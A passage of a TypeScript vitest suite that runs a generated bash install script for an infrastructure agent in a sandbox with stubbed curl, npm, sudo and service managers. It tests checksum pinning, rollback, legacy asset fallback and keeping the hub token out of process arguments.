/**
 * Exercises the generated install script end to end in a sandbox.
 *
 * `HOME` points at a temporary directory and `PATH` starts with stubs for
 * `curl`, `npm`, and the service manager, so a test never reaches the network,
 * never installs a launchd or systemd service, and never touches the real
 * `~/.runner-center`.
 *
 * @vitest-environment node
 *
 * The suite spawns bash and reads the filesystem, so it needs the real Node
 * runtime rather than the edge-runtime default the convex-test suites use.
 */
import { afterAll, describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import path from "node:path";
import {
  AGENT_RELEASE,
  INFRA_AGENT_TARGETS,
  infraAgentAssetName,
  type AgentRelease,
} from "../convex/agentRelease.ts";
import { resolveSiteUrl } from "../convex/githubAppConfig.ts";
import { renderInstallScript } from "../convex/installScript.ts";
import { renderPowerShellInstallScript } from "../convex/installScriptPowerShell.ts";

const SITE_URL = "https://example.convex.site";
const TEST_REPO = "runner-center-tests/runner-center";
const MACHINE_TOKEN = "a".repeat(32);
const SERVICE_KIND = process.platform === "darwin" ? "launchd" : "systemd";

const sandboxes: string[] = [];

afterAll(() => {
  for (const directory of sandboxes) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function writeExecutable(filePath: string, contents: string) {
  writeFileSync(filePath, contents);
  chmodSync(filePath, 0o755);
}

function siteUrlAssignments(script: string) {
  return [...script.matchAll(/^SITE_URL='([^']*)'$/gm)].map((match) => match[1]);
}

/** A stub that answers only the URLs a test registers, and logs every request. */
const CURL_STUB = `#!/usr/bin/env bash
out=""
want_status=0
url=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -o) out=$2; shift 2 ;;
    -w) want_status=1; shift 2 ;;
    -H|--data|--max-time) shift 2 ;;
    -*) shift ;;
    *) url=$1; shift ;;
  esac
done
printf '%s\\n' "$url" >> "$RC_TEST_CURL_LOG"
entry=$(awk -F '|' -v u="$url" '$1 == u { print $2 "|" $3; exit }' "$RC_TEST_ROUTES")
if [ -z "$entry" ]; then
  if [ "$want_status" -eq 1 ]; then printf '404'; fi
  exit 22
fi
status=$(printf '%s' "$entry" | cut -d '|' -f 1)
body=$(printf '%s' "$entry" | cut -d '|' -f 2)
if [ -n "$out" ]; then cp "$body" "$out"; else cat "$body"; fi
if [ "$want_status" -eq 1 ]; then printf '%s' "$status"; fi
exit 0
`;

const NPM_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_NPM_LOG"
if [ "$RC_TEST_NPM_FAIL" = "1" ]; then
  printf 'npm stub failure\\n' >&2
  exit 1
fi
if [ "$1" = "ci" ]; then
  mkdir -p node_modules
  printf 'installed\\n' > node_modules/.installed
fi
exit 0
`;

/** Both service managers "start" the agent by publishing its versioned readiness file. */
const SERVICE_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SERVICE_LOG"
for arg in "$@"; do
  case "$arg" in
    kickstart|restart)
      if [ "$RC_TEST_CONNECT" = "1" ]; then
        version=$(node -p "require(process.env.HOME + '/.runner-center/agent/package.json').version")
        printf '%s\\n' "$version" > "$HOME/.runner-center/agent.ready"
      fi
      ;;
  esac
done
exit 0
`;

/**
 * An unprivileged box. Every privileged step the Node installer attempts is refused, which keeps a
 * test from writing /etc/portless or a systemd unit on the machine running the suite, and exercises
 * the fallback the installer takes on a box where the operator is not root.
 */
const SUDO_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SUDO_LOG"
exit 1
`;

/**
 * A box where the operator *can* become root, with every privileged path redirected under
 * RC_TEST_SUDO_ROOT. Reaching the systemd branch is the only way to test it, and the redirection is
 * what keeps "reach it" from meaning "write /etc/systemd on the machine running the suite".
 */
const ROOT_SUDO_STUB = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_SUDO_LOG"
count=$#
while [ "$count" -gt 0 ]; do
  arg=$1
  shift
  case "$arg" in
    /etc/*|/run/systemd*) set -- "$@" "$RC_TEST_SUDO_ROOT$arg" ;;
    *) set -- "$@" "$arg" ;;
  esac
  count=$((count - 1))
done
exec "$@"
`;

type Sandbox = {
  root: string;
  home: string;
  rcHome: string;
  scriptPath: string;
  routesPath: string;
  curlLog: string;
  npmLog: string;
  fixtures: string;
  sudoRoot: string;
};

function createSandbox(release: AgentRelease): Sandbox {
  const root = mkdtempSync(path.join(tmpdir(), "rc-install-"));
  sandboxes.push(root);
  const home = path.join(root, "home");
  const binDir = path.join(root, "bin");
  const fixtures = path.join(root, "fixtures");
  for (const directory of [home, binDir, fixtures]) {
    mkdirSync(directory, { recursive: true });
  }
  expect(home, "the sandbox must not be the real home directory").not.toBe(homedir());

  writeExecutable(
    path.join(binDir, "node"),
    `#!/usr/bin/env bash\nexec ${process.execPath} "$@"\n`,
  );
  writeExecutable(path.join(binDir, "npm"), NPM_STUB);
  writeExecutable(path.join(binDir, "curl"), CURL_STUB);
  writeExecutable(path.join(binDir, "launchctl"), SERVICE_STUB);
  writeExecutable(path.join(binDir, "systemctl"), SERVICE_STUB);
  writeExecutable(path.join(binDir, "sudo"), SUDO_STUB);

  const scriptPath = path.join(root, "install.sh");
  writeFileSync(scriptPath, renderInstallScript(SITE_URL, release));

  const routesPath = path.join(root, "routes");
  writeFileSync(routesPath, "");

  return {
    root,
    home,
    rcHome: path.join(home, ".runner-center"),
    scriptPath,
    routesPath,
    curlLog: path.join(root, "curl.log"),
    npmLog: path.join(root, "npm.log"),
    fixtures,
    sudoRoot: path.join(root, "root"),
  };
}

/**
 * Let this sandbox's installer succeed at being root. /etc/systemd/system is created because every
 * box that has systemd already has it — the installer creates /etc/portless and nothing else.
 */
function grantRoot(sandbox: Sandbox) {
  writeExecutable(path.join(sandbox.root, "bin", "sudo"), ROOT_SUDO_STUB);
  mkdirSync(path.join(sandbox.sudoRoot, "run", "systemd", "system"), { recursive: true });
  mkdirSync(path.join(sandbox.sudoRoot, "etc", "systemd", "system"), { recursive: true });
}

/** Re-render the script, e.g. once a published archive's checksum is known. */
function repin(sandbox: Sandbox, release: AgentRelease) {
  writeFileSync(sandbox.scriptPath, renderInstallScript(SITE_URL, release));
}

function route(sandbox: Sandbox, url: string, filePath: string, status = 200) {
  const existing = readFileSync(sandbox.routesPath, "utf8");
  writeFileSync(sandbox.routesPath, `${existing}${url}|${status}|${filePath}\n`);
}

/** Build a release archive shaped like the real one, plus its checksum sidecar. */
function publishRelease(
  sandbox: Sandbox,
  release: AgentRelease,
  marker: string,
  assetPrefix: "erainfra-agent" | "runner-center-agent" = "erainfra-agent",
) {
  const stage = path.join(sandbox.fixtures, `stage-${release.version}`, "agent");
  mkdirSync(path.join(stage, "dist"), { recursive: true });
  mkdirSync(path.join(stage, "provisioners"), { recursive: true });
  writeFileSync(path.join(stage, "dist", "index.js"), `// ${marker}\n`);
  writeFileSync(path.join(stage, "package.json"), `{"version":"${release.version}"}\n`);
  writeFileSync(path.join(stage, "package-lock.json"), '{"lockfileVersion":3}\n');
  writeFileSync(path.join(stage, "provisioners", "provision-linux.sh"), "#!/usr/bin/env bash\n");
  for (const architecture of ["x86_64", "arm64"]) {
    const runtime = path.join(stage, "runtime", `linux-${architecture}`, "runner-center-runtime");
    mkdirSync(path.dirname(runtime), { recursive: true });
    writeExecutable(runtime, "#!/usr/bin/env bash\nexit 0\n");
  }

  const assetName = `${assetPrefix}-${release.version}.tar.gz`;
  const archivePath = path.join(sandbox.fixtures, assetName);
  const tar = spawnSync("tar", ["-czf", archivePath, "-C", path.dirname(stage), "agent"]);
  expect(tar.status, tar.stderr?.toString()).toBe(0);

  const sha256 = createHash("sha256").update(readFileSync(archivePath)).digest("hex");
  const checksumPath = `${archivePath}.sha256`;
  writeFileSync(checksumPath, `${sha256}  ${assetName}\n`);

  const base = `https://github.com/${release.repo}/releases/download/v${release.version}`;
  route(sandbox, `${base}/${assetName}`, archivePath);
  route(sandbox, `${base}/${assetName}.sha256`, checksumPath);
  return { sha256, checksumPath, archivePath };
}

function publishRegistration(sandbox: Sandbox) {
  const responsePath = path.join(sandbox.fixtures, "register.json");
  writeFileSync(
    responsePath,
    JSON.stringify({ machineToken: MACHINE_TOKEN, convexUrl: "https://example.convex.cloud" }),
  );
  route(sandbox, `${SITE_URL}/agents/register`, responsePath);
}

/** Pretend an older agent is already installed and running on this machine. */
function seedExistingInstall(sandbox: Sandbox, version: string, marker: string) {
  const agentDir = path.join(sandbox.rcHome, "agent");
  mkdirSync(path.join(agentDir, "dist"), { recursive: true });
  writeFileSync(path.join(agentDir, "dist", "index.js"), `// ${marker}\n`);
  writeFileSync(path.join(agentDir, "package.json"), `{"version":"${version}"}\n`);
  writeFileSync(
    path.join(agentDir, ".env"),
    `CONVEX_URL=https://example.convex.cloud\nMACHINE_TOKEN=${MACHINE_TOKEN}\n`,
  );
  writeFileSync(
    path.join(sandbox.rcHome, "install-meta"),
    [
      `SITE_URL=${SITE_URL}`,
      "NODE_BIN=/does/not/matter/node",
      "MACHINE_NAME=seeded-machine",
      `SERVICE_KIND=${SERVICE_KIND}`,
      `AGENT_VERSION=${version}`,
      "",
    ].join("\n"),
  );
  writeFileSync(path.join(sandbox.rcHome, "agent.log"), "");
}

function run(
  sandbox: Sandbox,
  args: readonly string[],
  options: { connect?: boolean; npmFails?: boolean } = {},
) {
  return spawnSync("bash", [sandbox.scriptPath, ...args], spawnOptions(sandbox, options));
}

function spawnOptions(sandbox: Sandbox, options: { connect?: boolean; npmFails?: boolean } = {}) {
  return {
    encoding: "utf8" as const,
    env: {
      PATH: `${path.join(sandbox.root, "bin")}:/usr/bin:/bin:/usr/sbin:/sbin`,
      HOME: sandbox.home,
      RC_TEST_ROUTES: sandbox.routesPath,
      RC_TEST_CURL_LOG: sandbox.curlLog,
      RC_TEST_NPM_LOG: sandbox.npmLog,
      RC_TEST_SERVICE_LOG: path.join(sandbox.root, "service.log"),
      RC_TEST_NPM_FAIL: options.npmFails === true ? "1" : "0",
      RC_TEST_CONNECT: options.connect === false ? "0" : "1",
      RC_TEST_SUDO_LOG: path.join(sandbox.root, "sudo.log"),
      RC_TEST_SUDO_ROOT: sandbox.sudoRoot,
      RC_TEST_AGENT_LOG: path.join(sandbox.root, "infra-agent.log"),
    },
  };
}

function readLog(filePath: string) {
  return existsSync(filePath) ? readFileSync(filePath, "utf8") : "";
}

function agentMarker(sandbox: Sandbox, directory = "agent") {
  return readFileSync(path.join(sandbox.rcHome, directory, "dist", "index.js"), "utf8").trim();
}

function metaField(sandbox: Sandbox, key: string) {
  const meta = readFileSync(path.join(sandbox.rcHome, "install-meta"), "utf8");
  return meta
    .split("\n")
    .find((line) => line.startsWith(`${key}=`))
    ?.slice(key.length + 1);
}

const CURRENT: AgentRelease = { repo: TEST_REPO, version: "1.4.2", sha256: "", infraAgent: {} };
const OLDER: AgentRelease = { repo: TEST_REPO, version: "1.3.0", sha256: "", infraAgent: {} };

describe("install", () => {
  it("installs the immutable release asset this deployment pins", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, ["--token", "rcreg_test", "--name", "test-machine"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(
      /https:\/\/github\.com\/runner-center-tests\/runner-center\/releases\/download\/v1\.4\.2\/erainfra-agent-1\.4\.2\.tar\.gz$/m,
    );
    expect(requested).not.toMatch(/archive\/refs\/heads/);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.4.2");
    expect(readFileSync(path.join(sandbox.rcHome, "agent.ready"), "utf8")).toBe("1.4.2\n");
    expect(readFileSync(path.join(sandbox.rcHome, "agent", ".env"), "utf8")).toMatch(
      new RegExp(`MACHINE_TOKEN=${MACHINE_TOKEN}`),
    );
    for (const architecture of ["x86_64", "arm64"]) {
      const runtime = path.join(
        sandbox.rcHome,
        "agent",
        "runtime",
        `linux-${architecture}`,
        "runner-center-runtime",
      );
      expect(existsSync(runtime)).toBeTruthy();
      expect(statSync(runtime).mode & 0o111).not.toBe(0);
    }
  });

  it("falls back to the permanent legacy asset name for pre-rename releases", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "legacy-named agent", "runner-center-agent");
    publishRegistration(sandbox);

    const result = run(sandbox, ["--token", "rcreg_test", "--name", "test-machine"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(
      /releases\/download\/v1\.4\.2\/erainfra-agent-1\.4\.2\.tar\.gz\n.*releases\/download\/v1\.4\.2\/runner-center-agent-1\.4\.2\.tar\.gz$/m,
    );
    expect(requested).toMatch(
      /releases\/download\/v1\.4\.2\/runner-center-agent-1\.4\.2\.tar\.gz\.sha256$/m,
    );
    expect(requested).not.toMatch(/erainfra-agent-1\.4\.2\.tar\.gz\.sha256/);
    expect(agentMarker(sandbox)).toBe("// legacy-named agent");
  });

  it("installs dependencies from the release lockfile with npm ci", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    publishRegistration(sandbox);

    expect(run(sandbox, ["--token", "rcreg_test"]).status).toBe(0);
    expect(readLog(sandbox.npmLog)).toMatch(/^ci --omit=dev --no-audit --no-fund$/m);
    expect(
      existsSync(path.join(sandbox.rcHome, "agent", "node_modules", ".installed")),
    ).toBeTruthy();
  });
});

describe("update", () => {
  it("can replace the legacy CLI without corrupting its running shell", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "0.1.0", "legacy agent");
    route(sandbox, `${SITE_URL}/install`, sandbox.scriptPath);

    const legacyCli = path.join(import.meta.dirname, "fixtures", "legacy-rc-v0.sh");
    const rcPath = path.join(sandbox.rcHome, "bin", "rc");
    mkdirSync(path.dirname(rcPath), { recursive: true });
    writeExecutable(rcPath, readFileSync(legacyCli, "utf8"));

    const result = spawnSync("bash", [rcPath, "update"], spawnOptions(sandbox));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stderr).not.toMatch(/syntax error|unexpected EOF/);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(existsSync(rcPath)).toBeTruthy();
    expect(statSync(rcPath).mode & 0o111).not.toBe(0);
  });

  it("installs an older version when the operator supplies its independent checksum", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    const older = publishRelease(sandbox, OLDER, "older agent");
    seedExistingInstall(sandbox, "1.4.2", "current agent");

    const result = run(sandbox, ["--update", "--version", "v1.3.0", "--sha256", older.sha256]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);

    const requested = readLog(sandbox.curlLog);
    expect(requested).toMatch(/releases\/download\/v1\.3\.0\/erainfra-agent-1\.3\.0\.tar\.gz$/m);
    expect(requested).not.toMatch(/erainfra-agent-1\.4\.2/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.3.0");
  });

  it("refuses a historical release without an independently supplied checksum", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, OLDER, "older agent");
    seedExistingInstall(sandbox, "1.4.2", "current agent");

    const result = run(sandbox, ["--update", "--version", "v1.3.0"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/other than the deployment pin requires --sha256/);
    expect(readLog(sandbox.curlLog)).toBe("");
    expect(agentMarker(sandbox)).toBe("// current agent");
  });

  it("keeps the replaced installation so a bad release can be recovered", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    expect(run(sandbox, ["--update"]).status).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(agentMarker(sandbox, "agent.previous")).toBe("// older agent");
  });

  it("carries the machine credentials across the replacement", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    expect(run(sandbox, ["--update"]).status).toBe(0);
    expect(readFileSync(path.join(sandbox.rcHome, "agent", ".env"), "utf8")).toMatch(
      new RegExp(`MACHINE_TOKEN=${MACHINE_TOKEN}`),
    );
  });

  it("refuses an update when no machine is registered yet", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/No existing EraInfra registration/);
  });

  it("rejects a version that is not a release version", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--update", "--version", "main"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/--version must be a release version/);
  });
});

describe("checksum verification", () => {
  it("stops before touching the running agent when the archive does not match", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "tampered agent");
    writeFileSync(published.checksumPath, `${"0".repeat(64)}  erainfra-agent-1.4.2.tar.gz\n`);
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
    expect(readLog(sandbox.npmLog)).toBe("");
  });

  it("rejects an archive that the release vouches for but this deployment does not", () => {
    const sandbox = createSandbox({ ...CURRENT, sha256: "b".repeat(64) });
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/pinned by this EraInfra deployment/);
    expect(agentMarker(sandbox)).toBe("// older agent");
  });

  it("accepts an archive that matches the checksum passed on the command line", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");
    rmSync(published.checksumPath);

    const result = run(sandbox, ["--update", "--sha256", published.sha256]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
  });
});

describe("rollback", () => {
  // This one waits out the installer's own connect timeout before rolling
  // back, so it needs more than vitest's 5s default. The wait is the
  // behaviour under test: the script must not declare success early.
  it("restores the previous agent when the new one never connects", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");
    // A previous process or version must never satisfy this rollout's probe.
    writeFileSync(path.join(sandbox.rcHome, "agent.ready"), `${CURRENT.version}\n`);

    const result = run(sandbox, ["--update"], { connect: false });
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/rolled back to the previous installation/);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.3.0");
  }, 60_000);

  it("leaves the running agent in place when dependency installation fails", () => {
    const sandbox = createSandbox(CURRENT);
    publishRelease(sandbox, CURRENT, "new agent");
    seedExistingInstall(sandbox, "1.3.0", "older agent");

    const result = run(sandbox, ["--update"], { npmFails: true });

    expect(result.status).not.toBe(0);
    expect(agentMarker(sandbox)).toBe("// older agent");
    expect(!existsSync(path.join(sandbox.rcHome, "agent.previous"))).toBeTruthy();
  });
});

describe("rendered script", () => {
  const script = renderInstallScript(SITE_URL, AGENT_RELEASE);

  it("is valid bash", () => {
    const check = spawnSync("bash", ["-n"], { input: script, encoding: "utf8" });
    expect(check.status, check.stderr).toBe(0);
  });

  it("never downloads a mutable branch tarball", () => {
    expect(script).not.toMatch(/archive\/refs\/heads/);
    expect(script).toMatch(/releases\/download\/v\$VERSION/);
  });

  it("writes systemd agent output to the connection log", () => {
    expect(script).toMatch(/StandardOutput=append:\$LOG_FILE/);
    expect(script).toMatch(/StandardError=append:\$LOG_FILE/);
  });

  it("waits for a fresh readiness signal from the exact installed version", () => {
    expect(script).toMatch(/rm -f "\$RC_HOME\/agent\.ready"/);
    expect(script).toMatch(/cat "\$RC_HOME\/agent\.ready"/);
    expect(script).toMatch(/= "\$VERSION"/);
    expect(script).not.toMatch(/grep -Fq 'EraInfra agent connected'/);
  });

  it("tells the operator where background Profile warm-up is progressing", () => {
    expect(script).toMatch(/Profiles are prewarming in the background/);
    expect(script).toMatch(/rc logs -f/);
    expect(script).toMatch(/dashboard readiness detail/);
  });

  it("installs the on-demand benchmark against the Worker runtime volume", () => {
    expect(script).toMatch(/rc status \| doctor \| benchmark/);
    expect(script).toMatch(/RC_BENCHMARK_DIR="\$RC_HOME\/benchmarks"/);
    expect(script).toMatch(/dist\/benchmark-cli\.js/);
  });

  it("does not let an early launchd match fail status under pipefail", () => {
    expect(script).toMatch(
      /launchctl print "gui\/\$UID\/center\.runner\.agent" 2>\/dev\/null \| grep 'state = running' >\/dev\/null/,
    );
    expect(script).not.toMatch(/launchctl print[^\n]+grep -q 'state = running'/);
  });

  it("accepts either trusted Docker or isolated Firecracker on Linux", () => {
    expect(script).toMatch(/docker info/);
    expect(script).toMatch(/trusted-only Linux Profiles/);
    expect(script).toMatch(/"\$runtime" preflight/);
    expect(script).toMatch(/if \[ "\$usable" -eq 0 \]; then exit 1; fi/);
  });

  it("carries the release this deployment pins", () => {
    expect(AGENT_RELEASE.version).toMatch(/^\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)*$/);
    expect(AGENT_RELEASE.repo).toBe("Fanzzzd/erainfra");
    expect(
      AGENT_RELEASE.sha256 === "" || /^[0-9a-f]{64}$/.test(AGENT_RELEASE.sha256),
      "sha256 must be empty or a 64-character lowercase digest",
    ).toBeTruthy();
    expect(script).toMatch(new RegExp(`PINNED_VERSION='${AGENT_RELEASE.version}'`));
  });

  // A partially pinned Infra Agent is the dangerous shape: four verified targets and one that
  // installs whatever it downloads. Either every target this deployment could resolve is pinned,
  // or none is and the Node path refuses.
  it("pins every Infra Agent target, or none of them", () => {
    const pinned = Object.keys(AGENT_RELEASE.infraAgent);
    expect(
      pinned.length === 0 || pinned.length === INFRA_AGENT_TARGETS.length,
      `infraAgent covers ${pinned.length} of ${INFRA_AGENT_TARGETS.length} targets`,
    ).toBeTruthy();
    for (const target of pinned) {
      expect(INFRA_AGENT_TARGETS).toContain(target);
      expect(AGENT_RELEASE.infraAgent[target]).toMatch(/^[0-9a-f]{64}$/);
    }
  });
});

function nodeArgs(extra: readonly string[] = []) {
  return [
    "--role",
    "node",
    "--token",
    "plt_node_token",
    "--hub",
    "wss://hub.example.com/agent",
    "--name",
    "node-01",
    // The runtime install shells out to the distro package manager, which a test has no business
    // doing; the flag it is skipped with is the same one an operator uses.
    "--no-docker",
    ...extra,
  ];
}

/** Where a Node's agent lands — the prefix and binary name a running Node already holds. */
function installedAgent(sandbox: Sandbox) {
  return path.join(sandbox.home, ".portless", "bin", "portless-agent");
}

// The Node half of ADR 0006. A Node's binary used to arrive with no integrity check of any kind, so
// the tests that matter most here are the ones where verification says no: a path whose failure
// branch is untested is a path nobody has seen work.
describe("--role node", () => {
  const HOST_TARGET = `${process.platform === "darwin" ? "darwin" : "linux"}-${
    process.arch === "arm64" ? "arm64" : "x86_64"
  }`;

  /** A stand-in for the Infra Agent: runnable, so the installer can actually start it. */
  const FAKE_AGENT = `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$RC_TEST_AGENT_LOG"
sleep 5
`;

  function publishInfraAgent(sandbox: Sandbox, release: AgentRelease, body = FAKE_AGENT) {
    const asset = `infra-agent-${HOST_TARGET}`;
    const binaryPath = path.join(sandbox.fixtures, asset);
    writeFileSync(binaryPath, body);
    const sha256 = createHash("sha256").update(readFileSync(binaryPath)).digest("hex");
    route(
      sandbox,
      `https://github.com/${release.repo}/releases/download/v${release.version}/${asset}`,
      binaryPath,
    );
    return { sha256, binaryPath, asset };
  }

  function pinned(release: AgentRelease, digest: string): AgentRelease {
    return { ...release, infraAgent: { [HOST_TARGET]: digest } };
  }

  it("installs the binary this deployment pins, and says what it verified it against", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    const result = run(sandbox, nodeArgs());
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stdout).toMatch(
      new RegExp(
        `Verified infra-agent-${HOST_TARGET} against the checksum pinned by this EraInfra deployment`,
      ),
    );

    expect(existsSync(installedAgent(sandbox))).toBeTruthy();
    expect(readFileSync(installedAgent(sandbox), "utf8")).toBe(FAKE_AGENT);
    expect(statSync(installedAgent(sandbox)).mode & 0o111).not.toBe(0);
    expect(readLog(sandbox.curlLog)).toMatch(
      new RegExp(`releases/download/v1\\.4\\.2/infra-agent-${HOST_TARGET}$`, "m"),
    );
    // It runs, with the name it was given, under the frozen binary name — and the Hub credential
    // is not on that command line. /proc/<pid>/cmdline is world-readable, so a token in argv is a
    // token every local user can read for as long as the agent runs; the agent takes it from
    // PORTLESS_TOKEN instead, the same channel the systemd unit uses.
    const argv = readLog(path.join(sandbox.root, "infra-agent.log"));
    expect(argv).toMatch(/^connect --name node-01$/m);
    expect(argv).not.toMatch(/plt_node_token/);
  });

  it("refuses bytes that do not match the pin, and installs nothing", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, "0".repeat(64)));

    const result = run(sandbox, nodeArgs());
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(result.stderr).toMatch(/Nothing was installed/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
    expect(existsSync(path.join(sandbox.home, ".portless", "run", "agent.pid"))).toBe(false);
  });

  it("leaves an already-installed agent running when the new bytes do not match", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT, "#!/usr/bin/env bash\nsleep 5\n");
    repin(sandbox, pinned(CURRENT, "f".repeat(64)));
    mkdirSync(path.dirname(installedAgent(sandbox)), { recursive: true });
    writeExecutable(
      installedAgent(sandbox),
      "#!/usr/bin/env bash\n# the agent already installed\n",
    );

    expect(run(sandbox, nodeArgs()).status).not.toBe(0);
    expect(readFileSync(installedAgent(sandbox), "utf8")).toMatch(/the agent already installed/);
  });

  it("verifies a --source install exactly as it verifies a release install", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    // An air-gapped box: the bytes come off local disk, the digest still decides.
    const result = run(sandbox, nodeArgs(["--source", `file://${published.binaryPath}`]));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(existsSync(installedAgent(sandbox))).toBeTruthy();
    // Nothing was fetched over the network for the agent itself.
    expect(readLog(sandbox.curlLog)).not.toMatch(/infra-agent/);
  });

  it("refuses a --source whose bytes do not match, exactly as it refuses a release", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    // One byte of an otherwise good binary, which is the whole point of pinning a digest.
    const corrupted = path.join(sandbox.fixtures, "corrupted-infra-agent");
    writeFileSync(corrupted, `${FAKE_AGENT}#\n`);

    const result = run(sandbox, nodeArgs(["--source", `file://${corrupted}`]));
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/checksum verification failed/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  // deploy/infra/agent.sh has always offered a foreground run for watching a Node's first
  // connection. It keeps working through the verified installer, with the same verification and no
  // daemon left behind.
  it("runs in the foreground without installing a service, when asked", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(
      sandbox,
      CURRENT,
      '#!/usr/bin/env bash\nprintf \'%s\\n\' "$* | hub=$PORTLESS_HUB token=$PORTLESS_TOKEN" >> "$RC_TEST_AGENT_LOG"\n',
    );
    repin(sandbox, pinned(CURRENT, published.sha256));

    const result = run(sandbox, nodeArgs(["--foreground"]));
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    // The foreground process is the longest-lived of the three, so the credential belongs in its
    // environment here even more than on the paths that daemonise.
    const argv = readLog(path.join(sandbox.root, "infra-agent.log"));
    expect(argv).toMatch(
      /^connect --name node-01 \| hub=wss:\/\/hub\.example\.com\/agent token=plt_node_token$/m,
    );
    expect(argv.split("|")[0]).not.toMatch(/plt_node_token/);
    expect(existsSync(path.join(sandbox.home, ".portless", "run", "agent.pid"))).toBe(false);
    expect(readLog(path.join(sandbox.root, "sudo.log"))).not.toMatch(/systemctl/);
  });

  it("refuses a target this deployment pins no digest for", () => {
    const sandbox = createSandbox(CURRENT);
    publishInfraAgent(sandbox, CURRENT);
    // The pin covers a target that is not this host's.
    repin(sandbox, { ...CURRENT, infraAgent: { "solaris-sparc": "a".repeat(64) } });

    const result = run(sandbox, nodeArgs());
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(new RegExp(`pins no Infra Agent build for ${HOST_TARGET}`));
    expect(readLog(sandbox.curlLog)).not.toMatch(/infra-agent/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  it("refuses without the Hub the Node reports to", () => {
    const sandbox = createSandbox(CURRENT);
